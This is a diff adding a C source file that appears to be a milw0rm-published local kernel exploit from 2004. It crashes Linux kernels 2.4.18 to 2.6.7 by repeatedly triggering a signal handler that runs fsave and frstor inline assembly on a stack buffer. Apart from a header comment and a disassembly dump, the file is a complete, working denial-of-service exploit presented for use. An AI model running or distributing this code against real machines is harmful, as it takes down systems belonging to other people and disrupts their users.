@@ -1,0 +1,73 @@
+/* -----------------------------------------------------------------------------
+ * frstor Local Kernel exploit
+ * Crashes any kernel from 2.4.18
+ * to 2.6.7 because frstor in assembler inline offsets in memory by 4.
+ * Original proof of concept code
+ * by stian_@_nixia.no.
+ * Added some stuff by lorenzo_@_gnu.org
+ * and fixed the fsave line with (*fpubuf).
+ * -----------------------------------------------------------------------------
+ */
+
+/*
+-----------------------------------------
+Some debugging information made
+available by stian_@_nixia.no
+-----------------------------------------
+TakeDown:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $136, %esp
+        leal    -120(%ebp), %eax
+        movl    %eax, -124(%ebp)
+#APP
+        fsave -124(%ebp)
+
+#NO_APP
+        subl    $4, %esp
+        pushl   $1
+        pushl   $.LC0
+        pushl   $2
+        call    write
+        addl    $16, %esp
+        leal    -120(%ebp), %eax
+        movl    %eax, -128(%ebp)
+#APP
+        frstor -128(%ebp)
+
+#NO_APP
+        leave
+        ret
+*/
+
+#include <sys/time.h>
+#include <signal.h>
+#include <unistd.h>
+
+static void TakeDown(int ignore)
+{
+ char fpubuf[108];
+// __asm__ __volatile__ ("fsave %0\n" : : "m"(fpubuf));
+__asm__ __volatile__ ("fsave %0\n" : : "m"(*fpubuf)); 
+ write(2, "*", 1);
+ __asm__ __volatile__ ("frstor %0\n" : : "m"(fpubuf));
+}
+
+int main(int argc, char *argv[])
+{
+ struct itimerval spec;
+ signal(SIGALRM, TakeDown);
+ spec.it_interval.tv_sec=0;
+ spec.it_interval.tv_usec=100;
+ spec.it_value.tv_sec=0;
+ spec.it_value.tv_usec=100;
+ setitimer(ITIMER_REAL, &spec, NULL);
+ while(1)
+  write(1, ".", 1);
+
+ return 0;
+}
+// <<EOF
+
+
+// milw0rm.com [2004-06-25]
